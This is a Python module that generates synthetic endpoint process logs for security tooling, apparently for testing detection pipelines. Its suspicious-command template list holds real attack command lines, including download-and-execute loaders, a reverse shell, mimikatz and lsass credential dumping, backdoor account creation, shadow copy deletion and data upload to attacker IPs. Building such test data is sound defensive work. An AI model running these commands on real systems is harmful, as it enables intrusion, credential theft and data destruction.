"""Endpoint / process log generator."""

import random
import uuid
from .pools import (
    USERS_ALL, HOSTNAMES, INTERNAL_IPS, MALICIOUS_IPS,
    PROCS_NORMAL, PROCS_SUSPICIOUS, SUSPICIOUS_PATHS, pick_os,
)
from .helpers import random_timestamp, random_sha256, random_agent_version

# Backslash cannot appear inside f-string braces, so we use a constant.
_B = "\\"


def _suspicious_cmdline() -> str:
    mal_ip = random.choice(MALICIOUS_IPS)
    sha = random_sha256()[:50]
    templates = [
        f"powershell.exe -enc {sha}",
        f"powershell.exe -nop -w hidden -ep bypass -c IEX(New-Object Net.WebClient).DownloadString('http://{mal_ip}/p.ps1')",
        "powershell.exe Set-MpPreference -DisableRealtimeMonitoring $true",
        f"powershell.exe -c Invoke-WebRequest -Uri http://{mal_ip}/beacon.exe -OutFile C:{_B}Users{_B}Public{_B}svc.exe",
        "cmd.exe /c whoami /all && net user && net localgroup administrators",
        "cmd.exe /c net user hacker P@ssw0rd! /add && net localgroup administrators hacker /add",
        "cmd.exe /c nltest /dclist: && nltest /domain_trusts",
        "cmd.exe /c vssadmin delete shadows /all /quiet",
        f"certutil.exe -urlcache -split -f http://{mal_ip}/payload.exe C:{_B}Temp{_B}svc.exe",
        f"mshta.exe http://{mal_ip}/evil.hta",
        r'rundll32.exe javascript:"\..\mshtml,RunHTMLApplication"',
        f"regsvr32.exe /s /n /u /i:http://{mal_ip}/f.sct scrobj.dll",
        f"bitsadmin /transfer j /download /priority high http://{mal_ip}/m.exe C:{_B}Temp{_B}m.exe",
        f"net.exe use {_B}{_B}SRV-DC01{_B}C$ /user:administrator P@ssw0rd",
        f"psexec.exe {_B}{_B}SRV-DC01 -u admin -p P@ss cmd.exe",
        f"reg add HKCU{_B}Software{_B}Microsoft{_B}Windows{_B}CurrentVersion{_B}Run /v upd /d C:{_B}Temp{_B}svc.exe",
        f'schtasks /create /tn "SystemUpdate" /tr C:{_B}Temp{_B}beacon.exe /sc onlogon',
        f'sc create EvilSvc binpath= "C:{_B}Temp{_B}implant.exe" start= auto',
        'mimikatz.exe "sekurlsa::logonpasswords" exit',
        'mimikatz.exe "lsadump::dcsync /user:krbtgt" exit',
        f"procdump.exe -ma lsass.exe C:{_B}Temp{_B}lsass.dmp",
        f"reg save HKLM{_B}SAM C:{_B}Temp{_B}sam.hiv",
        f'curl.exe -X POST -F "file=@C:{_B}Temp{_B}d.7z" http://{mal_ip}/upload',
        f"bash -i >& /dev/tcp/{mal_ip}/4444 0>&1",
        f"wget http://{mal_ip}/implant -O /tmp/.h && chmod +x /tmp/.h && /tmp/.h",
        "cat /etc/shadow",
        "iptables -F && iptables -P INPUT ACCEPT",
    ]
    return random.choice(templates)


def generate(index: str, ts: str = None) -> dict:
    host = random.choice(HOSTNAMES)
    suspicious = random.random() < 0.12
    proc = random.choice(PROCS_SUSPICIOUS) if suspicious else random.choice(PROCS_NORMAL)
    user = random.choice(USERS_ALL)
    is_win = proc.endswith(".exe")
    os_fam, os_ver = pick_os("windows" if is_win else "linux")

    parents_win = ["explorer.exe", "services.exe", "cmd.exe", "powershell.exe", "svchost.exe"]
    parents_lin = ["bash", "sh", "systemd", "cron", "sshd"]
    parent = random.choice(parents_win if is_win else parents_lin)

    if suspicious:
        file_path = random.choice(SUSPICIOUS_PATHS)
    elif is_win:
        file_path = "C:" + _B + "Program Files" + _B
    else:
        file_path = "/usr/bin/"

    return {
        "_index": index,
        "_source": {
            "@timestamp": ts or random_timestamp(),
            "event.category": "process",
            "event.type": "start",
            "event.action": "process_started",
            "process.name": proc,
            "process.pid": random.randint(100, 65535),
            "process.command_line": _suspicious_cmdline() if suspicious else f"{proc} --normal",
            "process.hash.sha256": random_sha256(),
            "process.hash.md5": uuid.uuid4().hex,
            "process.parent.name": parent,
            "process.parent.pid": random.randint(1, 10000),
            "user.name": user,
            "host.name": host,
            "host.os.family": os_fam,
            "host.os.full": os_ver,
            "host.ip": [random.choice(INTERNAL_IPS)],
            "agent.type": random.choice(["elastic-agent", "endpoint", "sysmon"]),
            "agent.version": random_agent_version(),
            "tags": (
                (["suspicious_process"] if suspicious else [])
                + (["lolbin"] if suspicious and proc in PROCS_SUSPICIOUS[:12] else [])
            ),
            "message": f"{proc} (PID {random.randint(100, 65535)}) by {user} on {host}",
        },
    }